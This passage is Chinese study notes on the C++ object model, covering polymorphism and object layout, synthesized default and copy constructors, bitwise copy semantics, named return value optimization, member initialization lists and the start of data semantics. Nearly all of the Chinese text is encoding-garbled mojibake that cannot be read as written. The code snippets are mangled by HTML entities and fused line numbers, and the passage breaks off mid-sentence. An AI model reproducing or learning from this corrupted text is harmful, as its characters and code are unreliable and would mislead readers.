å¤šæ€çš„ä¸»è¦ç”¨é€”æ˜¯ç»ç”±ä¸€ä¸ªå…±åŒçš„æ¥å£æ¥å½±å“ç±»å‹çš„å°è£…ï¼Œè¿™ä¸ªæ¥å£é€šå¸¸è¢«å®šä¹‰åœ¨ä¸€ä¸ªæŠ½è±¡çš„base classä¸­ã€‚ éœ€è¦å¤šå°‘å†…å­˜æ‰èƒ½å¤Ÿè¡¨ç°ä¸€ä¸ªclass objectï¼Ÿä¸€èˆ¬è€Œè¨€è¦æœ‰ï¼š å…¶ nonstatic data membersçš„æ€»å’Œå¤§å°ã€‚ åŠ ä¸Šä»»ä½•ç”±äº alignment çš„éœ€æ±‚è€Œå¡«è¡¥ï¼ˆpaddingï¼‰ä¸Šå»çš„ç©ºé—´ã€‚ alignmentå°±æ˜¯å°†æ•°å€¼è°ƒæ•´åˆ°æŸæ•°çš„å€æ•°ã€‚åœ¨32ä½è®¡ç®—æœºä¸Šï¼Œé€šå¸¸alignmentä¸º4 bytesï¼ˆ32ä½ï¼‰ï¼Œä»¥ä½¿busçš„â€œè¿è¾“é‡â€è¾¾åˆ°æœ€é«˜æ•ˆç‡ã€‚ åŠ ä¸Šä¸ºäº†æ”¯æŒ virtual è€Œç”±å†…éƒ¨äº§ç”Ÿçš„ä»»ä½•é¢å¤–è´Ÿæ‹…ï¼ˆoverheadï¼‰ã€‚ â€œæŒ‡å‘ä¸åŒç±»å‹ä¹‹å„æŒ‡é’ˆâ€é—´çš„å·®å¼‚ï¼Œæ—¢ä¸åœ¨å…¶æŒ‡é’ˆè¡¨ç¤ºæ³•ä¸åŒï¼Œä¹Ÿä¸åœ¨å…¶å†…å®¹ï¼ˆä»£è¡¨ä¸€ä¸ªåœ°å€ï¼‰ä¸åŒï¼Œè€Œæ˜¯åœ¨å…¶æ‰€å¯»å€å‡ºæ¥çš„objectç±»å‹ä¸åŒã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œâ€œæŒ‡é’ˆç±»å‹â€ä¼šæ•™å¯¼ç¼–è¯‘å™¨å¦‚ä½•è§£é‡ŠæŸä¸ªç‰¹å®šåœ°å€ä¸­çš„å†…å­˜å†…å®¹åŠå…¶å¤§å°ã€‚ è½¬æ¢ï¼ˆcastï¼‰å…¶å®æ˜¯ä¸€ç§ç¼–è¯‘å™¨æŒ‡ä»¤ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹å®ƒå¹¶ä¸æ”¹å˜ä¸€ä¸ªæŒ‡é’ˆæ‰€å«çš„çœŸæ­£åœ°å€ï¼Œå®ƒåªå½±å“â€œè¢«æŒ‡å‡ºä¹‹å†…å­˜çš„å¤§å°å’Œå…¶å†…å®¹â€çš„è§£é‡Šæ–¹å¼ã€‚ æ€»è€Œè¨€ä¹‹ï¼Œå¤šæ€æ˜¯ä¸€ç§å¨åŠ›å¼ºå¤§çš„è®¾è®¡æœºåˆ¶ï¼Œå…è®¸ä½ ç»§æ‰¿ä¸€ä¸ªæŠ½è±¡çš„publicæ¥å£ä¹‹åï¼Œå°è£…ç›¸å…³çš„ç±»å‹ã€‚éœ€è¦ä»˜å‡ºçš„ä»£ä»·å°±æ˜¯é¢å¤–çš„é—´æ¥æ€§â€”â€”ä¸è®ºæ˜¯åœ¨â€œå†…å­˜çš„è·å¾—â€æˆ–æ˜¯åœ¨â€œç±»å‹çš„å†³æ–­â€ä¸Šã€‚C++é€šè¿‡classçš„pointerså’Œreferencesæ¥æ”¯æŒå¤šæ€ï¼Œè¿™ç§ç¨‹åºè®¾è®¡é£æ ¼å°±ç§°ä¸ºâ€œé¢å‘å¯¹è±¡â€ã€‚ C++ä¹Ÿæ”¯æŒå…·ä½“çš„ADTç¨‹åºé£æ ¼ï¼Œå¦‚ä»Šè¢«ç§°ä¸ºobject-basedï¼ˆOBï¼‰ã€‚ä¾‹å¦‚String classï¼Œä¸€ç§éå¤šæ€çš„æ•°æ®ç±»å‹ã€‚String classå¯ä»¥å±•ç¤ºå°è£…çš„éå¤šæ€å½¢å¼ï¼›å®ƒæä¾›ä¸€ä¸ªpublic æ¥å£å’Œä¸€ä¸ªprivateå®ç°ï¼ŒåŒ…æ‹¬æ•°æ®å’Œç®—æ³•ï¼Œä½†æ˜¯ä¸æ”¯æŒç±»å‹çš„æ‰©å……ã€‚å¦‚ä»Šçš„ Goï¼ŒRust éƒ½æ˜¯èµ°OBçš„è·¯çº¿ã€‚ ä¸€ä¸ªOBè®¾è®¡å¯èƒ½æ¯”ä¸€ä¸ªå¯¹ç­‰çš„OOè®¾è®¡é€Ÿåº¦æ›´å¿«è€Œä¸”ç©ºé—´æ›´ç´§å‡‘ã€‚é€Ÿåº¦å¿«æ˜¯å› ä¸ºæ‰€æœ‰çš„å‡½æ•°è°ƒç”¨æ“ä½œéƒ½åœ¨ç¼–è¯‘æ—¶æœŸè§£æå®Œæˆï¼Œå¯¹è±¡å»ºæ„èµ·æ¥æ—¶ä¸éœ€è¦è®¾ç½® virtual æœºåˆ¶ï¼›ç©ºé—´ç´§å‡‘åˆ™æ˜¯å› ä¸ºæ¯ä¸€ä¸ª class object ä¸éœ€è¦è´Ÿæ‹…ä¼ ç»Ÿä¸Šä¸ºäº†æ”¯æŒvirtualæœºåˆ¶è€Œéœ€è¦çš„é¢å¤–è´Ÿè·ã€‚ä¸è¿‡ï¼ŒOBè®¾è®¡æ¯”è¾ƒæ²¡æœ‰å¼¹æ€§ã€‚ äºŒã€æ„é€ å‡½æ•°è¯­æ„å­¦ implicitï¼šæš—ä¸­çš„ã€éšå¼çš„ï¼ˆåœ¨ç¨‹åºæºä»£ç ä¸­æ²¡æœ‰å‡ºç°ï¼‰ explicitï¼šæ˜¾å¼çš„ï¼ˆç¨‹åºæºä»£ç ä¸­å‡ºç°ï¼‰ trivialï¼šæ²¡æœ‰ç”¨çš„ nontrivialï¼šæœ‰ç”¨çš„ memberwiseï¼šå¯¹æ¯ä¸€ä¸ªmemberæ–½ä»¥â€¦â€¦ bitwiseï¼šå¯¹æ¯ä¸€ä¸ªbitæ–½ä»¥â€¦â€¦ semanticsï¼šè¯­æ„ 2.1 Default Constructorçš„æ„é€ æ“ä½œ C++æ–°æ‰‹ä¸€èˆ¬æœ‰ä¸¤ä¸ªå¸¸è§çš„è¯¯è§£ï¼š ä»»ä½•classå¦‚æœæ²¡æœ‰å®šä¹‰default constructorï¼Œå°±ä¼šè¢«åˆæˆå‡ºä¸€ä¸ªæ¥ã€‚ ç¼–è¯‘å™¨åˆæˆå‡ºæ¥çš„default constructorä¼šæ˜¾å¼è®¾å®šâ€œclass å†…æ¯ä¸€ä¸ª data memberçš„é»˜è®¤å€¼â€ã€‚ æœ‰4ç§æƒ…å†µï¼Œä¼šé€ æˆâ€œç¼–è¯‘å™¨å¿…é¡»ä¸ºæœªå£°æ˜ constructor çš„classesåˆæˆä¸€ä¸ªdefault constructorâ€ã€‚C++Standard æŠŠé‚£äº›åˆæˆç‰©ç§°ä¸º implicit nontrivial default constructorsã€‚ â€œå¸¦æœ‰ Default Constructorâ€çš„ Member Class Object å¦‚æœä¸€ä¸ªclassæ²¡æœ‰ä»»ä½•constructorï¼Œä½†å®ƒå†…å«ä¸€ä¸ªmember objectï¼Œè€Œåè€…æœ‰default constructorï¼Œé‚£ä¹ˆè¿™ä¸ªclassçš„ implicit default constructorå°±æ˜¯â€œnontrivialâ€ï¼Œç¼–è¯‘å™¨éœ€è¦ä¸ºè¯¥class åˆæˆå‡ºä¸€ä¸ªdefault constructorã€‚ä¸è¿‡è¿™ä¸ªåˆæˆæ“ä½œåªæœ‰åœ¨constructorçœŸæ­£éœ€è¦è¢«è°ƒç”¨æ—¶æ‰ä¼šå‘ç”Ÿã€‚å†ä¸€æ¬¡è¯·ä½ æ³¨æ„ï¼Œè¢«åˆæˆçš„default constructoråªæ»¡è¶³ç¼–è¯‘å™¨çš„éœ€è¦ï¼Œè€Œä¸æ˜¯ç¨‹åºçš„éœ€è¦ã€‚ å¦‚æœå¯¹è±¡çš„æˆå‘˜æ²¡æœ‰å®šä¹‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨åˆæˆçš„é»˜è®¤æ„é€ å‡½æ•°å°†ä¸ä¼šä¸ºä¹‹æä¾›åˆå§‹åŒ–ã€‚ä¾‹å¦‚ç±»AåŒ…å«ä¸¤ä¸ªæ•°æ®æˆå‘˜å¯¹è±¡ï¼Œåˆ†åˆ«ä¸ºï¼šstring strå’Œchar* Cstrï¼Œé‚£ä¹ˆç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤æ„é€ å‡½æ•°å°†åªæä¾›å¯¹stringç±»å‹æˆå‘˜çš„åˆå§‹åŒ–ï¼Œè€Œä¸ä¼šæä¾›å¯¹ char* ç±»å‹çš„åˆå§‹åŒ–ã€‚ â€œå¸¦æœ‰ Default Constructorâ€çš„ Base Class å¦‚æœä¸€ä¸ªæ²¡æœ‰ä»»ä½•constructorsçš„classæ´¾ç”Ÿè‡ªä¸€ä¸ªâ€œå¸¦æœ‰default constructorâ€çš„base classï¼Œé‚£ä¹ˆè¿™ä¸ªderived class çš„default constructor ä¼šè¢«è§†ä¸ºnontrivialï¼Œå¹¶å› æ­¤éœ€è¦è¢«åˆæˆå‡ºæ¥ã€‚å®ƒå°†è°ƒç”¨ä¸Šä¸€å±‚ base classes çš„ default constructorï¼ˆæ ¹æ®å®ƒä»¬çš„å£°æ˜é¡ºåºï¼‰ã€‚å¯¹ä¸€ä¸ªåç»§æ´¾ç”Ÿçš„classè€Œè¨€ï¼Œè¿™ä¸ªåˆæˆçš„constructorå’Œä¸€ä¸ªâ€œè¢«æ˜¾å¼æä¾›çš„default constructorâ€æ²¡æœ‰ä»€ä¹ˆå·®å¼‚ã€‚ â€œå¸¦æœ‰ä¸€ä¸ª Virtual Functionâ€çš„ Class å¦æœ‰ä¸¤ç§æƒ…å†µï¼Œä¹Ÿéœ€è¦åˆæˆå‡ºdefault constructorï¼š classå£°æ˜ï¼ˆæˆ–ç»§æ‰¿ï¼‰ä¸€ä¸ª virtual functionã€‚ classæ´¾ç”Ÿè‡ªä¸€ä¸ªç»§æ‰¿ä¸²é“¾ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæˆ–æ›´å¤šçš„ virtual base classesã€‚ â€œå¸¦æœ‰ä¸€ä¸ª Virtual Base Classâ€çš„ Class Virtual base class çš„å®ç°ï¼Œåœ¨ä¸åŒçš„ç¼–è¯‘å™¨ä¹‹é—´æœ‰æå¤§çš„å·®å¼‚ã€‚ç„¶è€Œï¼Œæ¯ä¸€ç§å®ç°æ³•çš„å…±åŒç‚¹åœ¨äºå¿…é¡»ä½¿virtual base classåœ¨å…¶æ¯ä¸€ä¸ªderived class objectä¸­çš„ç©ºé—´ä½ç½®ï¼Œèƒ½å¤Ÿäºæ‰§è¡ŒæœŸå‡†å¤‡å¦¥å½“ã€‚ è¢«åˆæˆå‡ºæ¥çš„constructoråªèƒ½æ»¡è¶³ç¼–è¯‘å™¨ï¼ˆè€Œéç¨‹åºï¼‰çš„éœ€è¦ã€‚ è‡³äºæ²¡æœ‰å­˜åœ¨é‚£4ç§æƒ…å†µè€Œåˆæ²¡æœ‰å£°æ˜ä»»ä½•constructorçš„classesï¼Œå®é™…ä¸Šdefault constructorå¹¶ä¸ä¼šè¢«åˆæˆå‡ºæ¥ã€‚ åœ¨åˆæˆçš„ default constructor ä¸­ï¼Œåªæœ‰ base class subobjects å’Œ member class objects ä¼šè¢«åˆå§‹åŒ–ã€‚æ‰€æœ‰å…¶ä»–çš„nonstatic data memberï¼ˆå¦‚æ•´æ•°ã€æ•´æ•°æŒ‡é’ˆã€æ•´æ•°æ•°ç»„ç­‰ç­‰ï¼‰éƒ½ä¸ä¼šè¢«åˆå§‹åŒ–ã€‚ è¿™äº›åˆå§‹åŒ–æ“ä½œå¯¹ç¨‹åºè€Œè¨€æˆ–è®¸æœ‰éœ€è¦ï¼Œä½†å¯¹ç¼–è¯‘å™¨åˆ™éå¿…è¦ã€‚å¦‚æœç¨‹åºéœ€è¦ä¸€ä¸ªâ€œæŠŠæŸæŒ‡é’ˆè®¾ä¸º0â€çš„default constructorï¼Œé‚£ä¹ˆæä¾›å®ƒçš„äººåº”è¯¥æ˜¯ç¨‹åºå‘˜ã€‚ 2.2 Copy Constructorçš„æ„é€ æ“ä½œ Default Memberwise Initialization å½“class object ä»¥â€œç›¸åŒ class çš„å¦ä¸€ä¸ª objectâ€ä½œä¸ºåˆå€¼ï¼Œå…¶å†…éƒ¨æ˜¯ä»¥æ‰€è°“çš„default memberwise initializationæ‰‹æ³•å®Œæˆçš„ï¼Œä¹Ÿå°±æ˜¯æŠŠæ¯ä¸€ä¸ªå†…å»ºçš„æˆ–æ´¾ç”Ÿçš„data memberï¼ˆä¾‹å¦‚ä¸€ä¸ªæŒ‡é’ˆæˆ–ä¸€ä¸ªæ•°ç»„ï¼‰çš„å€¼ï¼Œä»æŸä¸ªobjectæ‹·è´ä¸€ä»½åˆ°å¦ä¸€ä¸ªobjectèº«ä¸Šã€‚ ä¸è¿‡å®ƒå¹¶ä¸ä¼šæ‹·è´å…¶ä¸­çš„ member class objectï¼Œè€Œæ˜¯ä»¥é€’å½’çš„æ–¹å¼æ–½è¡Œ memberwise initializationã€‚ C++Standardä¸Šè¯´ï¼Œå¦‚æœclassæ²¡æœ‰å£°æ˜ä¸€ä¸ªcopy constructorï¼Œå°±ä¼šæœ‰éšå¼çš„å£°æ˜ï¼ˆimplicitly declaredï¼‰æˆ–éšå¼çš„å®šä¹‰ï¼ˆimplicitly definedï¼‰å‡ºç°ã€‚å’Œä»¥å‰ä¸€æ ·ï¼ŒC++Standard æŠŠcopy constructoråŒºåˆ†ä¸ºtrivialå’Œnontrivialä¸¤ç§ã€‚åªæœ‰nontrivialçš„å®ä¾‹æ‰ä¼šè¢«åˆæˆäºç¨‹åºä¹‹ä¸­ã€‚ å†³å®šä¸€ä¸ªcopy constructoræ˜¯å¦ä¸ºtrivialçš„æ ‡å‡†åœ¨äºclass æ˜¯å¦å±•ç°å‡ºæ‰€è°“çš„â€œbitwise copy semanticsâ€ã€‚ Bitwise Copy Semanticsï¼ˆä½é€æ¬¡æ‹·è´ï¼‰ åœ¨è¿™è¢«åˆæˆå‡ºæ¥çš„default copy constructorä¸­ï¼Œå¦‚æ•´æ•°ã€æŒ‡é’ˆï¼ˆæµ…æ‹·è´ï¼‰ã€æ•°ç»„ç­‰ç­‰çš„non class membersä¹Ÿéƒ½ä¼šè¢«å¤åˆ¶ã€‚ ä»€ä¹ˆæ—¶å€™ä¸€ä¸ªclassä¸å±•ç°å‡ºâ€œbitwise copy semanticsâ€å‘¢ï¼Ÿæœ‰4ç§æƒ…å†µï¼š å½“classå†…å«ä¸€ä¸ªmember objectè€Œåè€…çš„classå£°æ˜æœ‰ä¸€ä¸ªcopy constructoræ—¶ï¼ˆä¸è®ºæ˜¯è¢« classè®¾è®¡è€…æ˜¾å¼åœ°å£°æ˜ï¼Œå°±åƒå‰é¢çš„ Stringé‚£æ ·ï¼›æˆ–æ˜¯è¢«ç¼–è¯‘å™¨åˆæˆï¼Œåƒ class Wordé‚£æ ·ï¼‰ã€‚ å½“classç»§æ‰¿è‡ªä¸€ä¸ªbase classè€Œåè€…å­˜åœ¨ä¸€ä¸ªcopy constructoræ—¶ï¼ˆä¸è®ºæ˜¯è¢«æ˜¾å¼å£°æ˜æˆ–æ˜¯è¢«åˆæˆè€Œå¾—ï¼‰ã€‚ å½“classå£°æ˜äº†ä¸€ä¸ªæˆ–å¤šä¸ªvirtual functionsæ—¶ã€‚ å½“classæ´¾ç”Ÿè‡ªä¸€ä¸ªç»§æ‰¿ä¸²é“¾ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªvirtual base classesæ—¶ã€‚ é‡æ–°è®¾å®šVirtual Tableçš„æŒ‡é’ˆ å›å¿†ç¼–è¯‘æœŸé—´çš„ä¸¤ä¸ªç¨‹åºæ‰©å¼ æ“ä½œï¼ˆåªè¦æœ‰ä¸€ä¸ªclasså£°æ˜äº†ä¸€ä¸ªæˆ–å¤šä¸ªvirtual functionså°±ä¼šå¦‚æ­¤ï¼‰ï¼š å¢åŠ ä¸€ä¸ªvirtual function tableï¼ˆvtblï¼‰ï¼Œå†…å«æ¯ä¸€ä¸ªæœ‰ä½œç”¨çš„virtual functionçš„åœ°å€ã€‚ ä¸€ä¸ªæŒ‡å‘virtual function tableçš„æŒ‡é’ˆï¼ˆvptrï¼‰ï¼Œå®‰æ’åœ¨æ¯ä¸€ä¸ªclass objectå†…ã€‚ ç¼–è¯‘å™¨åˆæˆå‡ºæ¥çš„ copy constructor ä¼šæ˜¾å¼è®¾å®š lhs objectçš„ vptr æŒ‡å‘ rhs çš„ virtual tableï¼Œè€Œä¸æ˜¯ç›´æ¥ä»rhsçš„class object ä¸­å°†vptrå€¼æ‹·è´è¿‡æ¥ã€‚ å¤„ç† Virtual Base Class Subobject 1234567class Base&#123; int x;&#125;;class Derived : Base &#123; int y;&#125;; åœ¨è¿™ä¸ªç»§æ‰¿ä½“ç³»é‡Œï¼Œæ¯ä¸ª Derived ç±»å‹çš„ object å°±åŒ…å«äº†ä¸€ä¸ª Base ç±»å‹çš„ subobject ã€‚ ä¸€ä¸ªsubobjectå¯ä»¥æ˜¯æˆå‘˜å­å¯¹è±¡ï¼ˆmember subobjectï¼‰ï¼ŒåŸºç±»å­å¯¹è±¡ï¼ˆbase class subobjectï¼‰ï¼Œæˆ–è€…æˆå‘˜æ•°ç»„çš„å…ƒç´ ã€‚ Virtual base classçš„å­˜åœ¨éœ€è¦ç‰¹åˆ«å¤„ç†ã€‚ä¸€ä¸ªclass object å¦‚æœä»¥å¦ä¸€ä¸ªobjectä½œä¸ºåˆå€¼ï¼Œè€Œåè€…æœ‰ä¸€ä¸ª virtual base class subobjectï¼Œé‚£ä¹ˆä¹Ÿä¼šä½¿â€œbitwise copy semanticsâ€å¤±æ•ˆã€‚ æ¯ä¸€ä¸ªç¼–è¯‘å™¨å¯¹äºè™šç»§æ‰¿ï¼Œéƒ½å¿…é¡»è®©â€œderived class objectä¸­çš„virtual base class subobjectä½ç½®â€åœ¨æ‰§è¡ŒæœŸå°±å‡†å¤‡å¦¥å½“ã€‚ç»´æŠ¤â€œä½ç½®çš„å®Œæ•´æ€§â€æ˜¯ç¼–è¯‘å™¨çš„è´£ä»»ã€‚ â€œBitwise copy semanticsâ€å¯èƒ½ä¼šç ´åè¿™ä¸ªä½ç½®ã€‚ å°ç»“ Bitwise Copy Semanticséƒ¨åˆ†å±•ç¤ºäº†4ç§æƒ…å†µï¼Œåœ¨é‚£äº›æƒ…å†µä¸‹classä¸å†ä¿æŒâ€œbitwise copy semanticsâ€ï¼Œè€Œä¸” default copy constructor ä¼šè¢«è§†ä¸º nontrivialã€‚ å½“classå†…å«ä¸€ä¸ªmember objectè€Œåè€…çš„classå£°æ˜æœ‰ä¸€ä¸ªcopy constructoræ—¶ï¼ˆä¸è®ºæ˜¯è¢« classè®¾è®¡è€…æ˜¾å¼åœ°å£°æ˜ï¼Œå°±åƒå‰é¢çš„ Stringé‚£æ ·ï¼›æˆ–æ˜¯è¢«ç¼–è¯‘å™¨åˆæˆï¼Œåƒ class Wordé‚£æ ·ï¼‰ã€‚ å½“classç»§æ‰¿è‡ªä¸€ä¸ªbase classè€Œåè€…å­˜åœ¨ä¸€ä¸ªcopy constructoræ—¶ï¼ˆä¸è®ºæ˜¯è¢«æ˜¾å¼å£°æ˜æˆ–æ˜¯è¢«åˆæˆè€Œå¾—ï¼‰ã€‚ å½“classå£°æ˜äº†ä¸€ä¸ªæˆ–å¤šä¸ªvirtual functionsæ—¶ã€‚ å½“classæ´¾ç”Ÿè‡ªä¸€ä¸ªç»§æ‰¿ä¸²é“¾ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªvirtual base classesæ—¶ã€‚ åœ¨è¿™4ç§æƒ…å†µä¸‹ï¼Œå¦‚æœç¼ºä¹ä¸€ä¸ªå·²å£°æ˜çš„ copy constructorï¼Œç¼–è¯‘å™¨ä¸ºäº†æ­£ç¡®å¤„ç†â€œä»¥ä¸€ä¸ªclass object ä½œä¸ºå¦ä¸€ä¸ªclass object çš„åˆå€¼â€ï¼Œå¿…é¡»åˆæˆå‡ºä¸€ä¸ªdefault copy constructorã€‚ 2.3 ç¨‹åºè½¬åŒ–è¯­æ„å­¦ è½¬åŒ– æ˜¾å¼çš„åˆå§‹åŒ–æ“ä½œï¼ˆExplicit Initializationï¼‰ å‚æ•°çš„åˆå§‹åŒ–ï¼ˆArgument Initializationï¼‰ è¿”å›å€¼çš„åˆå§‹åŒ–ï¼ˆReturn Value Initializationï¼‰ ä¼˜åŒ–æ–¹æ³•ï¼š åœ¨ä½¿ç”¨è€…å±‚é¢åšä¼˜åŒ–ï¼ˆOptimization at the User Levelï¼‰ åœ¨ç¼–è¯‘å™¨å±‚é¢åšä¼˜åŒ–ï¼ˆOptimization at the Compiler Levelï¼‰ã€‚Named Return Valueï¼ˆNRVï¼‰ä¼˜åŒ– copy constructorçš„åº”ç”¨ï¼Œè¿«ä½¿ç¼–è¯‘å™¨å¤šå¤šå°‘å°‘å¯¹ä½ çš„ç¨‹åºä»£ç åšéƒ¨åˆ†è½¬åŒ–ã€‚å°¤å…¶æ˜¯å½“ä¸€ä¸ªå‡½æ•°ä»¥ä¼ å€¼ï¼ˆby valueï¼‰çš„æ–¹å¼ä¼ å›ä¸€ä¸ªclass objectï¼Œè€Œè¯¥classæœ‰ä¸€ä¸ªcopy constructoræ—¶ã€‚ æ­¤å¤–ï¼Œç¼–è¯‘å™¨ä¹Ÿå°†copy constructorçš„è°ƒç”¨æ“ä½œä¼˜åŒ–ï¼Œä»¥ä¸€ä¸ªé¢å¤–çš„ç¬¬ä¸€å‚æ•°ï¼ˆæ•°å€¼è¢«ç›´æ¥å­˜æ”¾äºå…¶ä¸­ï¼‰å–ä»£ NRVã€‚ç¨‹åºå‘˜å¦‚æœäº†è§£é‚£äº›è½¬æ¢ï¼Œä»¥åŠcopy constructor ä¼˜åŒ–åçš„å¯èƒ½çŠ¶æ€ï¼Œå°±æ¯”è¾ƒèƒ½å¤Ÿæ§åˆ¶å…¶ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ã€‚ å‘½åè¿”å›å€¼ä¼˜åŒ– ï¼ˆNamed Return Value Optimizationï¼‰ å¯¹äºä¸€ä¸ªå¦‚foo()è¿™æ ·çš„å‡½æ•°ï¼Œå®ƒçš„æ¯ä¸€ä¸ªè¿”å›åˆ†æ”¯éƒ½è¿”å›ç›¸åŒçš„å¯¹è±¡ï¼Œç¼–è¯‘å™¨æœ‰å¯èƒ½å¯¹å…¶åšNamed return Valueä¼˜åŒ–ï¼ˆä¸‹æ–‡éƒ½ç®€ç§°NRVä¼˜åŒ–ï¼‰ï¼Œæ–¹æ³•æ˜¯ä»¥å¼•ç”¨çš„æ–¹å¼ä¼ å…¥ä¸€ä¸ªå‚æ•°resultå–ä»£è¿”å›å¯¹è±¡ã€‚ 1234567X foo() &#123; X xx; if(...) return xx; else return xx; &#125; ä¼˜åŒ–åçš„foo()ä»¥resultå–ä»£xxï¼š 123456789void foo(X &amp;result) &#123; result.X::X(); if(...) &#123; return; &#125; else &#123; return; &#125;&#125; å¯¹æ¯”ä¼˜åŒ–å‰ä¸ä¼˜åŒ–åçš„ä»£ç å¯ä»¥çœ‹å‡ºï¼Œå¯¹äºä¸€å¥ç±»ä¼¼äºX a = foo()è¿™æ ·çš„ä»£ç ï¼ŒNRVä¼˜åŒ–åçš„ä»£ç ç›¸è¾ƒäºåŸä»£ç èŠ‚çœäº†ä¸€ä¸ªä¸´æ—¶å¯¹è±¡çš„ç©ºé—´ï¼ˆçœç•¥äº†xxï¼‰ï¼ŒåŒæ—¶å‡å°‘äº†ä¸¤æ¬¡å‡½æ•°è°ƒç”¨ï¼ˆå‡å°‘xxå¯¹è±¡çš„é»˜è®¤æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ï¼Œä»¥åŠä¸€æ¬¡æ‹·è´æ„é€ å‡½æ•°çš„è°ƒç”¨ï¼‰ï¼Œå¢åŠ äº†ä¸€æ¬¡ X a çš„é»˜è®¤æ„é€ å‡½æ•°çš„è°ƒç”¨ã€‚ 2.4 æˆå‘˜ä»¬çš„åˆå§‹åŒ–é˜Ÿä¼ï¼ˆMember Initialization Listï¼‰ å½“ä½ å†™ä¸‹ä¸€ä¸ªconstructoræ—¶ï¼Œå°±æœ‰æœºä¼šè®¾å®šclass membersçš„åˆå€¼ã€‚ç»ç”±member initialization listï¼Œæˆ–åœ¨constructorå‡½æ•°æœ¬ä½“ä¹‹å†…ã€‚ åœ¨ä¸‹åˆ—æƒ…å†µä¸‹ï¼Œä¸ºäº†è®©ä½ çš„ç¨‹åºèƒ½å¤Ÿè¢«é¡ºåˆ©ç¼–è¯‘ï¼Œä½ å¿…é¡»ä½¿ç”¨member initialization listï¼š å½“åˆå§‹åŒ–ä¸€ä¸ªreference memberæ—¶ï¼› å½“åˆå§‹åŒ–ä¸€ä¸ªconst memberæ—¶ï¼› å½“è°ƒç”¨ä¸€ä¸ªbase classçš„constructorï¼Œè€Œå®ƒæ‹¥æœ‰ä¸€ç»„å‚æ•°ï¼Œæ²¡æœ‰é»˜è®¤æ„é€ å‡½æ•°æ—¶ï¼› å½“è°ƒç”¨ä¸€ä¸ªmember classçš„constructorï¼Œè€Œå®ƒæ‹¥æœ‰ä¸€ç»„å‚æ•°ï¼Œæ²¡æœ‰é»˜è®¤æ„é€ å‡½æ•°æ—¶ã€‚ å‰ä¸¤è€…å› ä¸ºè¦æ±‚å®šä¹‰æ—¶åˆå§‹åŒ–ï¼Œæ‰€ä»¥å¿…é¡»æ˜ç¡®çš„åœ¨åˆå§‹åŒ–é˜Ÿåˆ—ä¸­ç»™å®ƒä»¬æä¾›åˆå€¼ã€‚åä¸¤è€…å› ä¸ºä¸æä¾›é»˜è®¤æ„é€ å‡½æ•°ï¼Œæ‰€æœ‰å¿…é¡»æ˜¾ç¤ºçš„è°ƒç”¨å®ƒä»¬çš„å¸¦å‚æ„é€ å‡½æ•°æ¥å®šä¹‰å³åˆå§‹åŒ–å®ƒä»¬ã€‚ ç¼–è¯‘å™¨ä¼šä¸€ä¸€æ“ä½œinitialization listï¼Œä»¥é€‚å½“é¡ºåºåœ¨constructorä¹‹å†…å®‰æ’åˆå§‹åŒ–æ“ä½œï¼Œå¹¶ä¸”åœ¨ä»»ä½•explicit user codeä¹‹å‰ã€‚listä¸­çš„é¡¹ç›®é¡ºåºæ˜¯ç”±classä¸­çš„memberså£°æ˜é¡ºåºå†³å®šçš„ï¼Œä¸æ˜¯ç”±initialization listä¸­çš„æ’åˆ—é¡ºåºå†³å®šçš„ã€‚ ç®€ç•¥åœ°è¯´ï¼Œç¼–è¯‘å™¨ä¼šå¯¹initialization list ä¸€ä¸€å¤„ç†å¹¶å¯èƒ½é‡æ–°æ’åºï¼Œä»¥åæ˜ å‡ºmembersçš„å£°æ˜é¡ºåºã€‚å®ƒä¼šå®‰æ’ä¸€äº›ä»£ç åˆ°constructorä½“å†…ï¼Œå¹¶ç½®äºä»»ä½•explicit user codeä¹‹å‰ã€‚initialzation list çš„æ‰§è¡Œå…ˆäºç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°ä½“ã€‚ ä¸‰ã€Dataè¯­æ„å­¦ï¼ˆThe Semantics of Dataï¼‰ classçš„data membersä»¥åŠclass hierarchyæ˜¯ä¸­å¿ƒè®®é¢˜ã€‚ä¸€ä¸ªclassçš„data membersï¼Œä¸€èˆ¬è€Œè¨€ï¼Œå¯ä»¥è¡¨ç°è¿™ä¸ªclassåœ¨ç¨‹åºæ‰§è¡Œæ—¶çš„æŸç§çŠ¶æ€ã€‚Nonstatic data membersæ”¾ç½®çš„æ˜¯â€œä¸ªåˆ«çš„class objectâ€æ„Ÿå…´è¶£çš„æ•°æ®ï¼Œstatic data membersåˆ™æ”¾ç½®çš„æ˜¯â€œæ•´ä¸ªclassâ€æ„Ÿå…´è¶£çš„æ•°æ®ã€‚ C++å¯¹è±¡æ¨¡å‹å°½é‡ä»¥ç©ºé—´ä¼˜åŒ–å’Œå­˜å–é€Ÿåº¦ä¼˜åŒ–çš„è€ƒè™‘æ¥è¡¨ç°nonstatic data membersï¼Œå¹¶ä¸”ä¿æŒå’ŒCè¯­è¨€structæ•°æ®é…ç½®çš„å…¼å®¹æ€§ã€‚å®ƒæŠŠæ•°æ®ç›´æ¥å­˜æ”¾åœ¨æ¯ä¸€ä¸ªclass objectä¹‹ä¸­ã€‚å¯¹äºç»§æ‰¿è€Œæ¥çš„nonstatic data members ï¼ˆä¸ç®¡æ˜¯virtualè¿˜æ˜¯nonvirtual base classï¼‰ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ä¸è¿‡å¹¶æ²¡æœ‰å¼ºåˆ¶å®šä¹‰å…¶é—´çš„æ’åˆ—é¡ºåºã€‚ è‡³äºstatic data membersï¼Œåˆ™è¢«æ”¾ç½®åœ¨ç¨‹åºçš„ä¸€ä¸ªglobal data segment ä¸­ï¼Œä¸ä¼šå½±å“ä¸ªåˆ«çš„class objectçš„å¤§å°ã€‚åœ¨ç¨‹åºä¹‹ä¸­ï¼Œä¸ç®¡è¯¥classè¢«äº§ç”Ÿå‡ºå¤šå°‘ä¸ªobjectsï¼ˆç»ç”±ç›´æ¥äº§ç”Ÿæˆ–é—´æ¥æ´¾ç”Ÿï¼‰ï¼Œstatic data 